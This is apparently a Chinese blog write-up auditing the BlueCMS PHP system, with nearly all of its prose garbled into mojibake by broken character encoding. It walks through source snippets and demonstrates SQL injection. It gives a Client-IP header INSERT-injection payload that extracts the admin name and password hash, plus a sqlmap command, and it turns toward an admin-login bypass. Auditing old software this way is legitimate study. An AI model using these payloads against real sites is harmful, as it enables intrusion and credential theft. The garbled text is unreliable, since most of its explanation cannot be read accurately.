é¦–å…ˆå®šä¹‰äº†å¸¸é‡ï¼Œç„¶ååŒ…å«äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œè‡³äºåšä»€ä¹ˆå…ˆä¸ç”¨ç®¡ï¼Œç„¶åè¿™é‡Œè°ƒç”¨äº†do_taskå‡½æ•°ï¼Œå‚æ•°é‡Œé¢æ˜¯ä¸€ä¸ªupdate_infoï¼Œè·Ÿè¿›å»å‘ç°å°±æ˜¯ä¸€ä¸ªæ›´æ–°ä»»åŠ¡çš„æ„æ€ å¤§æ¦‚æ„æ€å°±æ˜¯åŠ¨æ€åŒ…å«phpæ–‡ä»¶ ä¸­é—´éƒ¨åˆ†é€»è¾‘ç›¸åŒï¼Œæ— éå°±æ˜¯è°ƒç”¨å‡½æ•°ï¼Œè·å–å½“å‰æ•°æ®åº“ä¿¡æ¯ï¼Œæ¯”å¦‚æ–°é—»åˆ—è¡¨ï¼Œåˆ†ç±»ä¿¡æ¯ã€æ¨èä¿¡æ¯ä¹‹ç±»çš„ã€‚ç„¶åå°±æ˜¯é€šè¿‡ä¸‹é¢è¿™ä¸€éƒ¨åˆ†ä»£ç ï¼Œæ¸²æŸ“åˆ°å‰ç«¯é¡µé¢ä¸Šï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°é‡‡ç”¨çš„æ˜¯smartyæ¨¡æ¿å¼•æ“æ¸²æŸ“ è¿™é‡Œä¹Ÿå°±çŸ¥é“äº†ï¼Œindex.phpè¿™ä¸ªæ‰€è°“çš„å…¥å£æ–‡ä»¶ï¼Œåªæ˜¯å•çº¯çš„åšä¸€ä¸ªå‰ç«¯é¡µé¢æ˜¾ç¤ºçš„å·¥ä½œã€‚è¿™é‡Œé‚£ç¯‡æ–‡ç« è¯´åˆ°ï¼šè¿™é‡Œå¯ä»¥åˆ¤æ–­å‡ºå‰å°æ˜¯ä¸€ä¸ªå¤šå…¥å£çš„æ¨¡å¼ï¼Œæ³¨æ„å¤šå…¥å£çš„ç³»ç»Ÿéœ€è¦å¯¹æ¯ä¸ªå…¥å£æ–‡ä»¶å•ç‹¬åšå‡ºå®‰å…¨è¿‡æ»¤ï¼Œä»–ä»¬éƒ½ä¼šåŠ è½½åŒä¸€ä¸ªæ–‡ä»¶æ¥å®ç°ï¼Œå†è¿™ä¸ªCMSä¸Šå°±æ˜¯common.inc.php ç„¶åè·Ÿè¿›/include/common.inc.phpæ–‡ä»¶ï¼Œå‰é¢çš„éƒ¨åˆ†ä¾æ—§æ˜¯å®šä¹‰å¸¸é‡ï¼ŒåŒ…å«æŸäº›æ–‡ä»¶ if(!get_magic_quotes_gpc()) { $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST); } ç„¶ååˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯GPCçš„è¯ï¼Œå°±è°ƒç”¨deep_addslasheså‡½æ•°è½¬ä¹‰è¿™äº›å‚æ•°çš„å†…å®¹ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤$_SERVERè¿‡æ»¤ï¼Œç„¶åå°±æ˜¯$dbå‚æ•°åœ¨è¿™é‡Œå……å½“è¿æ¥æ•°æ®åº“çš„ä½œç”¨ ä¸‹é¢è¿™é‡Œæ˜¯å¼•å…¥äº†smartyå¯¹è±¡ åŒæ—¶è¿˜æœ‰å¯¹ç”¨æˆ·IPçš„å¤„ç†ï¼Œè¾¾åˆ°æŸäº›æ¡ä»¶ï¼Œå°†ä¼šğŸˆ²IP æœ€åå°±æ˜¯å…³äºä¸€äº›cookieä»¥åŠsessionä¼šè¯çš„å¤„ç†äº†ï¼Œå…ˆä¸å…³æ³¨ï¼Œè¿™é‡Œå›åˆ°æœ€åˆï¼Œçœ‹ä¸€ä¸‹é‚£ä¸ªè¿‡æ»¤å‡½æ•°çš„å†…å®¹ï¼Œæ¯•ç«Ÿæœ‰è¿‡æ»¤ï¼Œé‚£å¦‚æœèƒ½ç»•è¿‡ï¼Œå°±æœ‰é€ æˆæ¼æ´çš„å¯èƒ½ å¦‚ä¸Šå›¾ï¼Œå‡½æ•°å…ˆåˆ¤è¯»å‚æ•°æ˜¯å¦æ˜¯æ•°ç»„ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œé€’å½’è°ƒç”¨æœ¬å‡½æ•°ï¼Œç›´åˆ°ä¸æ˜¯æ•°ç»„ï¼Œç„¶åè°ƒç”¨PHPè‡ªå¸¦çš„å‡½æ•°addslashesè¿›è¡Œç‰¹æ®Šå­—ç¬¦çš„è½¬ç§» æ¥ä¸‹æ¥å¯ä»¥å†å…³æ³¨æ•°æ®åº“è¿æ¥çš„å†…å®¹ï¼šå½“å‰ç›®å½•çš„mysql.class.phpï¼Œå†…å®¹å¤§è‡´å¦‚ä¸‹ class mysql { var $linkid=null; function __construct($dbhost, $dbuser, $dbpw, $dbname = '', $dbcharset = 'gbk', $connect = 1) { $this -&gt; mysql($dbhost, $dbuser, $dbpw, $dbname, $dbcharset, $connect); } function mysql($dbhost, $dbuser, $dbpw, $dbname = '', $dbcharset = 'gbk', $connect=1){ $func = empty($connect) ? 'mysql_pconnect' : 'mysql_connect'; if(!$this-&gt;linkid = @$func($dbhost, $dbuser, $dbpw, true)){ $this-&gt;dbshow('Can not connect to Mysql!'); } else { if($this-&gt;dbversion() &gt; '4.1'){ mysql_query( \"SET NAMES gbk\"); if($this-&gt;dbversion() &gt; '5.0.1'){ mysql_query(\"SET sql_mode = ''\",$this-&gt;linkid); } } } if($dbname){ if(mysql_select_db($dbname, $this-&gt;linkid)===false){ $this-&gt;dbshow(\"Can't select MySQL database($dbname)!\"); } } } è¿™é‡Œå¯ä»¥çœ‹åˆ°åˆå§‹åŒ–å˜é‡ï¼Œç„¶åè°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä¸€äº›ä¿¡æ¯ï¼Œå¹¶ä¸”èƒ½çœ‹åˆ°è¿™é‡Œçš„æ•°æ®åº“ç¼–ç æ–¹å¼ä¸ºgbkï¼Œè¯´ä¸å®šå­˜åœ¨å®½å­—ç¬¦æ³¨å…¥ï¼Œç„¶åmysqlå‡½æ•°ä¸­ï¼Œç”¨mysql_pconnectå‡½æ•°æ¥è¿æ¥æ•°æ®åº“ï¼Œåˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼Œç„¶åé€‰æ‹©æ‰§è¡Œå¯¹åº”çš„è¯­å¥ï¼Œå‰©ä¸‹æ²¡å±•ç¤ºçš„å°±æ˜¯ä¸€äº›è‡ªå®šä¹‰çš„sqlæ‰§è¡Œå‡½æ•° æ‰¾åå° åå°ä¸€èˆ¬åªæœ‰é€šè¿‡èº«ä»½éªŒè¯åæ‰èƒ½è®¿é—®ï¼Œæå‰å°±æœ‰ä¸€å±‚å®‰å…¨ä¿éšœï¼Œä½†åå°ç¨‹åºä¸€èˆ¬éƒ½æ˜¯æ¼æ´ç™¾å‡ºï¼Œæˆ‘ä»¬å¾ˆå¤šæ—¶å€™åªæœ‰é åå°æ‰èƒ½æ‹¿åˆ°æœåŠ¡å™¨çš„shellã€‚è¿™é‡Œå…·ä½“åˆ†æä¸€ä¸‹BlueCMSçš„åå°é€»è¾‘ è¿™é‡Œçš„åå°æ–‡ä»¶ï¼Œæˆ‘ä»¬çœ‹ç›®å½•ä¸éš¾çŒœåˆ°ï¼Œæœ‰ä¸€ä¸ª/admin/index.phpï¼Œè¿™é‡Œæˆªå–éƒ¨åˆ†ä»£ç ï¼Œå‰é¢ä¸ç”¨è¯´ï¼Œä¸‹é¢å°±æ˜¯åˆ¤æ–­actå‚æ•°çš„å€¼ï¼Œæ¥å¯¹åº”çš„å±•ç¤ºåå°é¡µé¢ define('IN_BLUE', true); require_once(dirname(__FILE__) . \"/include/common.inc.php\"); //require_once(dirname(__FILE__). \"/include/menu.fun.php\"); $act=!empty($_REQUEST['act']) ? trim($_REQUEST['act']) : ''; if($act=='') { $smarty-&gt;display('index.htm'); } elseif($act=='top') { $smarty-&gt;assign('admin_name', $_SESSION['admin_name']); $smarty-&gt;display('top.htm'); } elseif($act=='menu') { $cat_list = $db-&gt;getall(\"SELECT cat_id, cat_name FROM \".table('category').\" WHERE parentid=0 ORDER BY show_order,cat_id\"); $arc_cat_list = $db-&gt;getall(\"SELECT cat_id, cat_name FROM \".table('arc_cat').\" WHERE parent_id=0 ORDER BY show_order, cat_id\"); template_assign(array('cat_list', 'arc_cat_list'), array($cat_list, $arc_cat_list)); /*if($_SESSION['admin_purview'][0] != 'all'){ if(!file_exists(BLUE_ROOT.DATA.'admin/menu'.$_SESSION['admin_id'].'.html')){ create_menu($_SESSION['admin_id']); } //read_menu($_SESSION['admin_id']); $smarty-&gt;display(BLUE_ROOT.'data/admin/menu2.html'); }else{*/ $smarty-&gt;display('menu.htm'); //} } elseif($act == 'main') { è¿™é‡Œæ–‡ç« è¯´åˆ°ï¼šå…³æ³¨ index.htm å¯ä»¥çŸ¥é“åå°æ˜¯é€šè¿‡frameæ¥å®ç°çš„ï¼Œè¿™æ ·åå°ç¨‹åºçš„æ‰€æœ‰åŠŸèƒ½éƒ½å¯ä»¥ä¾é™„åœ¨index.phpä¸‹å®ç°ï¼Œåœ¨æ—©æœŸçš„CMSä¸­ï¼ŒåŸºæœ¬éƒ½æ˜¯è¿™ç§å®ç°æ–¹æ¡ˆ &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt; &lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" /&gt; &lt;title&gt;BlueCMSç®¡ç†ä¸­å¿ƒ&lt;/title&gt; &lt;/head&gt; &lt;frameset rows=\"76,*\" frameborder=\"no\" border=\"0\" framespacing=\"0\" &gt; &lt;frame src=\"index.php?act=top\" name=\"topFrame\" id=\"topFrame\" scrolling=\"no\" noresize&gt; &lt;frameset cols=\"176,*\" name=\"bodyFrame\" id=\"bodyFrame\" frameborder=\"no\" border=\"0\" framespacing=\"0\" &gt; &lt;frame src=\"index.php?act=menu\" name=\"menuFrame\" id=\"menuFrame\" scrolling=\"yes\" noresize&gt; &lt;frame src=\"index.php?act=main\" name=\"mainFrame\" id=\"mainFrame\" scrolling=\"auto\" noresize&gt; &lt;/frameset&gt; &lt;/frameset&gt; &lt;noframes&gt; &lt;body&gt;ä½ çš„æµè§ˆå™¨ä¸æ”¯æŒæ¡†æ¶&lt;/body&gt; &lt;/noframes&gt; &lt;/html&gt; è¿™é‡ŒåŒæ—¶è¿˜çœ‹åˆ°äº†è¯¥é¡µé¢åŠ è½½äº†/admin/include/common.inc.phpæ–‡ä»¶ï¼Œè¿™ä¸ªä¸/include/common.inc.phpç±»ä¼¼ï¼Œä½†ä¸åŒçš„æ˜¯åœ¨æœ€åçš„éƒ¨åˆ†ï¼Œå‰è€…æ˜¯æ ¹æ®cookieçš„ä¿¡æ¯ï¼Œåˆ¤æ–­å½“å‰ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦å­˜åœ¨ä¸æ•°æ®åº“ä¸­ è¿™ä¸€éƒ¨åˆ†å…ˆåˆ¤æ–­ï¼Œå¦‚æœç®¡ç†å‘˜å½“å‰å¤„äºç™»é™†çŠ¶æ€ï¼Œå¹¶ä¸”å¯¹åº”çš„admin_idæ˜¯å­˜åœ¨çš„ï¼Œåˆ™è°ƒç”¨update_admin_infoæ›´æ–°å½“å‰ç®¡ç†å‘˜ç”¨æˆ·çš„ä¿¡æ¯ã€‚ å¦‚æœå½“å‰ç®¡ç†å‘˜ç”¨æˆ·çš„ä¿¡æ¯æ˜¯ç©ºçš„ï¼Œå°±å›å»åˆ¤æ–­å¯¹åº”çš„cookieä¿¡æ¯ï¼Œå¦‚æœå¯¹åº”çš„æ•°æ®éƒ½å­˜åœ¨ï¼Œåˆ™è°ƒç”¨check_cookieå‡½æ•°ï¼Œåˆ¤æ–­è¯¥ç”¨æˆ·çš„è´¦å·å¯†ç æ˜¯å¦åœ¨æ•°æ®åº“ä¸­ï¼Œå¦‚æœè¯¥ç”¨æˆ·æ˜¯ç®¡ç†å‘˜çš„è¯ï¼Œè°ƒç”¨update_admin_infoæ›´æ–°ä¿¡æ¯ï¼›å¦‚æœæ²¡æœ‰è®¾ç½®cookieçš„ä¿¡æ¯ï¼Œå°±ç¨‹åºè‡ªå·±è®¾ç½®cookieä¸ºç©ºï¼Œç„¶åè·³è½¬åˆ°ç™»é™†é¡µé¢ã€‚ï¼ˆè¿™é‡Œå’Œå°±é˜²æ­¢äº†æœªæˆæƒï¼Œä¹Ÿå°±æ˜¯æƒ³ç›´æ¥è®¿é—®index.phpçš„åå°é¡µé¢æ˜¯ä¸å¯èƒ½çš„ï¼‰ 0x04 æ¼æ´å®¡è®¡ ç›®å‰æˆ‘çš„è‡ªåŠ¨è¯ä»£ç å®¡è®¡å·¥å…·åªæœ‰ä¸ªseayï¼Œä¹‹åäº†è§£ä¸€ä¸‹Fotify å‰å°sqlæ³¨å…¥ ç›´æ¥ä¸Šä¸€æ‰‹è‡ªåŠ¨åŒ–ï¼Œå¦‚ä¸Šå›¾çœ‹åˆ°ä¸€ä¸ªå¯èƒ½çš„sqlæ³¨å…¥ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹/ad_js.phpï¼ˆè¢«æ‰“å‡»åˆ°äº†ï¼Œå¤ªèœäº†ï¼Œå¾ˆç®€å•ï¼Œä½†è¿˜æ˜¯æ²¡çœ‹å‡ºæ¥ï¼‰ &lt;?php define('IN_BLUE', true); require_once dirname(__FILE__) . '/include/common.inc.php'; $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; if(empty($ad_id)) { echo 'Error!'; exit(); } $ad = $db-&gt;getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id); if($ad['time_set'] == 0) { $ad_content = $ad['content']; } else { if($ad['end_time'] &lt; time()) { $ad_content = $ad['exp_content']; } else { $ad_content = $ad['content']; } } $ad_content = str_replace('\"', '\\\"',$ad_content); $ad_content = str_replace(\"\\r\", \"\\\\r\",$ad_content); $ad_content = str_replace(\" \", \"\\ \",$ad_content); echo \"&lt;!--\\r document.write(\\\"\".$ad_content.\"\\\");\\r --&gt;\\r \"; ?&gt; å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆæ˜¯åŠ è½½äº†/include/common.inc.phpæ–‡ä»¶ï¼Œæˆ‘ä»¬çŸ¥é“å…¶ä¸­å­˜åœ¨ç€addslasheså‡½æ•°çš„å¯¹ç‰¹æ•°å­—ç¬¦çš„è¿‡æ»¤ï¼Œç„¶ååˆ¤æ–­ad_idå‚æ•°æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™èµ‹å€¼ä¸ºç©ºï¼Œä¸ä¸ºç©ºï¼Œåˆ™ç»è¿‡trimå‡½æ•°çš„å¤„ç†ï¼ˆä¹Ÿå°±æ˜¯å»é™¤å­—ç¬¦ä¸²é¦–ä½ç©ºå­—ç¬¦ï¼Œæ²¡å•¥ç”¨ï¼‰ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™é¦–é¡µç„¶åerroråé€€å‡ºã€‚ä¸æ˜¯ç©ºçš„è¯ï¼Œå°±è¿æ¥æ•°æ®åº“è¿›è¡Œè¯­å¥çš„æŸ¥è¯¢ï¼Œä¸­é—´éƒ¨åˆ†æ²¡å•¥ç”¨ï¼Œåˆ°æœ€åå°±æ˜¯å¯¹å›æ˜¾çš„å†…å®¹è¿›è¡Œå¤„ç†ï¼Œå¯¹å…¶ä¸­çš„æ¢è¡Œç¬¦ã€åŒå¼•å·ä¹‹ç±»çš„è¿›è¡Œè½¬ç§»ï¼Œé˜²æ­¢è¢«å½“æˆç‰¹æ®Šå­—ç¬¦å¯¹å¾…ã€‚ è¿™é‡Œé‡ç‚¹çœ‹sqlæŸ¥è¯¢è¯­å¥$ad = $db-&gt;getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id); tipsï¼šå½“æ—¶å°´å°¬äº†ï¼Œä»¥ä¸ºæ˜¯åŒå¼•å·é—­åˆçš„ï¼Œæ²¡å‘ç°åªæ˜¯å•çº¯çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼ŒåŒæ—¶å¯¹ad_idæ²¡å•¥è¿‡æ»¤ï¼ˆé™¤äº†addslashesï¼‰ï¼Œè¿™æ ·å°±èƒ½çŸ¥é“å°±æ˜¯å•çº¯çš„æ•°å­—å‹æ³¨å…¥ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ•°æ®åº“å¯¹åº”çš„adè¡¨ å¯ä»¥çœ‹åˆ°æœ‰7åˆ—ï¼Œé‚£æˆ‘ä»¬ç›´æ¥è”åˆæ³¨å…¥å³å¯ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘å°±å°†æºä»£ç çš„ï¼Œå¯¹htmlæ³¨é‡Šéƒ¨åˆ†å–æ¶ˆäº†ï¼Œè®©å…¶ç›´æ¥å›æ˜¾åˆ°é¡µé¢ï¼ˆæ‡’~ï¼‰ è¿™é‡Œçœ‹åˆ°å›æ˜¾ä½æ˜¯7ï¼Œæ ¹æ®æ•°æ®åº“çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¸€æ­¥åˆ°ä½æ‹¿åˆ°ç®¡ç†å‘˜å¯†ç ï¼ŒMD5è§£å¯†ä¸€ä¸‹å°±æ˜¯123 $_SERVERç»•è¿‡ æˆ‘ä»¬çŸ¥é“åœ¨ä¸Šé¢æåˆ°çš„å‡½æ•°ä¸­common.inc.phpå¹¶æ²¡æœ‰å¯¹$_SERVERåšå‡ºè¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªä¼ å…¥å¤–éƒ¨æ•°æ®é€ æˆæ¼æ´ï¼Œæ¥ä¸‹æ¥å¯ä»¥çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªåœ¨å“ªé‡Œè¢«è°ƒç”¨è¿‡ é©¬åç‚®çš„è¯ï¼Œå°±æ˜¯é¡ºç€é‚£ç‰‡æ–‡ç« çš„æ€è·¯ï¼Œæˆ‘ä»¬å°è¯•å€’ç€æ‰¾ä¸€æ¬¡ï¼Œå› ä¸ºæ²¡æœ‰å¯¹$_SERVERåšå‡ºé™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å…¨å±€æœç´¢$_SERVERçš„ä½¿ç”¨æƒ…å†µ å¦‚ä¸Šå›¾ï¼Œèƒ½å¤Ÿçœ‹åˆ°æœ‰å¾ˆå¤šåœ°æ–¹éƒ½æ˜¯ç”¨åˆ°äº†ï¼Œåœ¨æˆ‘çœ‹äº†æ–‡ç« ä»¥åŠè‡ªèº«çš„æ€è€ƒä¹‹åï¼Œå‘ç°ï¼Œå¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬ä¸å¿…ç›²ç›®çš„å°è¯•ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥éƒ½å…ˆçœ‹ä¸€éï¼Œé‡ç‚¹å…³æ³¨å…¶ä¸­å‚æ•°å¯æ§çš„ï¼Œæ¯”å¦‚ä¸¾å‡ ä¸ªä¸æ¼æ´æ— å…³çš„ä¾‹å­ è¿™é‡Œæ˜¯è·å–UAå¤´çš„ï¼Œæ˜æ˜¾å¯æ§ è¿™é‡Œä¸€ä¸ªæ˜¯è·å–addrè®¿é—®è€…IPçš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯softwareä¹Ÿå°±æ˜¯webæœåŠ¡ å°±è¿™æ ·ä¸€ä¸ªä¸ªçœ‹è¿‡å»ï¼Œæœ€åå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­¤æ¬¡çš„æ¼æ´ç‚¹ã€‚å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯å¯¹äºIPæ˜¯å¯æ§çš„ï¼ˆbpæŠ“åŒ…ä¿®æ”¹å³å¯ï¼‰ ä½†æ˜¯å½“æˆ‘ä»¬æ‰¾åˆ°è¿™ç§ç±»ä¼¼çš„æƒ…å†µï¼Œåˆè¯¥å¦‚ä½•åˆ©ç”¨ï¼Œé‚£å°±æ˜¯çœ‹è¯¥å€¼èµ‹ç»™äº†å“ªä¸ªå‚æ•°ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„æ¼æ´ç‚¹è¿™é‡Œï¼Œèµ‹å€¼ç»™äº†ipå˜é‡ï¼Œè€Œè¿™ä¸ªå˜é‡åˆåœ¨getipå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ï¼Œè°è°ƒç”¨äº†è¿™ä¸ªå‡½æ•° Insertæ³¨å…¥1 å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œèƒ½çœ‹åˆ°æœ‰ä¸¤ä¸ªåœ°æ–¹è°ƒç”¨è¿‡ å…ˆçœ‹ç¬¬ä¸€ä¸ªï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œç›´æ¥è°ƒç”¨getipå‡½æ•°æ¥è·å–IPï¼Œç„¶åinsertè¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬å¾€ä¸Šçœ‹ å¾€ä¸Šçœ‹çš„åŸå› æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°è¯¥è¯­å¥æ˜¯å¦æœ‰å›æ˜¾çš„åœ°æ–¹ï¼Œå¦åˆ™ï¼Œå³ä½¿æœ‰æ³¨å…¥ç‚¹ï¼Œçœ‹ä¸åˆ°ä¹Ÿæ²¡åŠæ³•ï¼ˆä¸è¿‡çªç„¶æƒ³åˆ°æ—¶é—´ç›²æ³¨ä¼¼ä¹å¯ä»¥ä¸å¿…åœ¨ä¹ï¼‰ è¿™é‡Œå®ƒé€šè¿‡comment.htmè¿›è¡Œæ¸²æŸ“ï¼Œå¾ˆæ˜æ˜¾åªæ˜¾ç¤ºå‘é€è¯„è®ºçš„å†…å®¹ï¼Œé‚£æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†sqlæ³¨å…¥è¯­å¥æ’å…¥åˆ°ä¸Šé¢çš„contentåœ°æ–¹ï¼Œæ‰èƒ½è®©å…¶æœ‰å›æ˜¾ è¿™é‡Œçš„å…¶ä»–å‚æ•°å°±ä¸èµ˜è¿°äº†ï¼Œæˆ‘ä»¬ç¿»çœ‹å°±èƒ½çŸ¥é“ï¼Œåªæœ‰å½“actå‚æ•°ä¸ºsendï¼Œå‚æ•°idå­˜åœ¨çš„æ—¶å€™æ‰è¡Œï¼Œæˆ–è€…ç›´æ¥åœ¨ä¸‹é¢çš„åœ°æ–¹ï¼Œè¾“å…¥å†…å®¹ï¼Œç‚¹å‡»è¯„è®ºæŠ“åŒ…ä¹Ÿå¯ è¿™é‡Œæˆ‘ä¹Ÿæ˜¯æœäº†å‡ ä¸ªæ³¨å…¥çš„æ–¹å¼ï¼Œä½†ä¸è¡Œï¼Œæœ€ç»ˆæ‰¾äº†å‡ ç¯‡æ–‡ç« æ‰çŸ¥é“çš„ï¼ˆæˆ‘çŸ¥é“äº†æˆ‘å½“æ—¶å‡ºä¸æ¥çš„åŸå› å°±æ˜¯è„‘å­å¤ªæ­»ï¼Œç”¨çš„ä¸çµæ´»ï¼Œé‚£ä¸ªsqlè¯­å¥å®Œå…¨ä¸é€‚ç”¨äºè¿™ä¸ªåœ°æ–¹ï¼Œä¸ä¼šå˜é€šï¼‰ å› ä¸ºè¿™é‡Œå¯¹æ˜¯é€šè¿‡$_SERVER[â€˜REMOTE_ADDRâ€™]è·å–çš„IPï¼Œæˆ‘ä»¬ç›´æ¥ä¼ªé€ xffå¤´æˆ–è€…client-ipå³å¯ï¼ŒåŒæ—¶æœ‰ä¸ªçŸ¥è¯†ç‚¹ï¼š insertè¯­å¥çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥insert into table (a,b,c) values (â€˜fuck1â€²,â€™fuck2â€²,â€™fuck3â€²),(â€˜fuck4â€²,â€™fuck5â€²,â€™fuck6â€²)â€¦â€¦è¿™æ ·å¯ä»¥å¤šæ’å‡ ä¸ªçš„ã€‚ å› æ­¤payloadå¦‚ä¸‹å›¾ Client-IP: 1','1'),('', '1', '0', '0', '0',(select concat(admin_name,0x3a,pwd) from blue_admin limit 0,1),'1645457407','sss','1')# æœ€ç»ˆæŸ¥çœ‹å³å¯ è¿™é‡Œæˆ‘ä»¬ä¸Šé¢ä¹Ÿæè¿‡ï¼Œå¯ä»¥æ— è„‘sqlmapè·‘ä¸€ä¸‹ï¼ŒbpæŠ“åŒ…ï¼Œåœ¨xffå¤´ä¸Šä¸ªæ ‡è®°ï¼š*ï¼Œç„¶åsqlmapå³å¯ python3 sqlmap.py -r \"1.txt\" --batch --level 4 -dbs Insertæ³¨å…¥2 æ¥åˆ°ç¬¬äºŒä¸ªè°ƒç”¨ç‚¹ï¼Œæˆ‘ä»¬å‘ç°è¯¥å‡½æ•°çš„å€¼è¢«èµ‹å€¼ç»™äº†ä¸€ä¸ªå˜é‡ï¼Œé‚£å°±ç»§ç»­è¿½è¸ªè¿™ä¸ªå˜é‡ã€‚ å¦‚ä¸‹å›¾ï¼Œèƒ½çœ‹åˆ°æœ‰å…«ä¸ªè°ƒç”¨ç‚¹ï¼Œè¿™é‡Œéƒ½éšä¾¿çœ‹çœ‹å°±çŸ¥é“ï¼Œåªæœ‰guest_book.phpï¼Œpublish.phpçš„åœ°æ–¹è¿˜æœ‰ç‚¹æ„æ€ï¼Œå‰©ä¸‹çš„è™½ç„¶æœ‰è°ƒç”¨ç‚¹ï¼Œä½†æ˜¯æ²¡åŠæ³•è¿›ä¸€æ­¥åˆ©ç”¨ã€‚ æ¯”å¦‚publish.phpä¸­ï¼Œè¿™é‡Œè™½ç„¶å°†online_ipå‚æ•°å€¼æ’å…¥äº†è¿›å»ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é¡µé¢å›æ˜¾çš„åœ°æ–¹ ä½†æ˜¯å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ï¼Œè¿™é‡Œä¹Ÿè¯æ˜æ˜¯å¯è¡Œçš„ ä¸è¿‡å½“æˆ‘é‡‡ç”¨ä¸Šè¿°åŒæ ·çš„insertæ³¨å…¥æ‰‹æ³•ï¼Œå‘ç°æ€»æ˜¯æŠ±é”™ï¼Œè¿™é‡Œä¸å¤ªç†è§£ä¸ºä½• Insertæ³¨å…¥3 è¿½è¸ªåˆ°guest_book.phpï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªç•™è¨€æ¿çš„åŠŸèƒ½ï¼Œè¯ä¸å¤šè¯´ï¼Œç›´æ¥å°è¯•æ³¨å…¥ è¿™é‡Œæ³¨å…¥çš„æ—¶å€™è¿˜é‡åˆ°ç‚¹é—®é¢˜ï¼Œå°±æ˜¯ridå‚æ•°çš„å€¼çš„é—®é¢˜ï¼Œå¦‚ä¸‹å›¾ï¼Œè¿™é‡Œå¦‚æœæˆ‘ä»¬ç‚¹å‡»äº†å‘å¸ƒæˆåŠŸä¹‹åæ˜¾ç¤ºç»™æˆ‘ä»¬çš„è¶…é“¾æ¥ï¼Œå°±ä¼šè°ƒç”¨act=listè¿™ä¸€å—å‡½æ•°ï¼Œè¿™é‡Œè®¤ä¸ºï¼Œå½“ridå‚æ•°å€¼ä¸º0çš„æ—¶å€™ï¼Œæ‰ä¼šæ­£å¸¸çš„å»æ˜¾ç¤ºè¯„è®ºé¡µé¢ã€‚ æˆ‘å½“æ—¶ç»™ridèµ‹å€¼ä¸ºäº†1ï¼Œå¯¼è‡´æˆ‘æ­»æ´»è§ä¸åˆ°æˆ‘ç•™è¨€çš„å†…å®¹ã€‚ã€‚ã€‚ã€‚ã€‚ å®½å­—èŠ‚æ³¨å…¥ åå°ä¸‡èƒ½å¯†ç  å› ä¸ºæˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ•°æ®åº“é€‰æ‹©äº†GBKç¼–ç ï¼Œé‚£å¤§æ¦‚ç‡æœ‰åœ°æ–¹èƒ½å¤Ÿåˆ©ç”¨å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡è¿‡æ»¤ã€‚æˆ‘ä»¬ç›´æ¥å®šä½åˆ°æ–‡ç« æ‰€è¯´çš„åœ°æ–¹ï¼š/admin/login.php ä»£ç é€»è¾‘å°±æ˜¯ï¼Œå½“æˆ‘ä»¬å°è¯•åœ¨åå°ç™»é™†çš„æ—¶å€™ï¼Œä¼šè·³è½¬åˆ°ä¸Šé¢è¿™æ®µä»£ç å—ï¼Œé¦–å…ˆåˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ä¸ºç©ºï¼Œå­˜åœ¨çš„è¯ï¼Œå°±è°ƒç”¨check_adminå‡½æ•°ï¼Œæ£€æŸ¥è¿™ä¸¤ä¸ªæ•°æ®åœ¨æ•°æ®åº“æ˜¯å¦å­˜åœ¨ã€‚ è¿™ä¸ªå‡½æ•°å†…éƒ¨å°±æ˜¯å¸¸è§„çš„æŸ¥è¯¢è¯­å¥ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°ä¸‡èƒ½å¯†ç 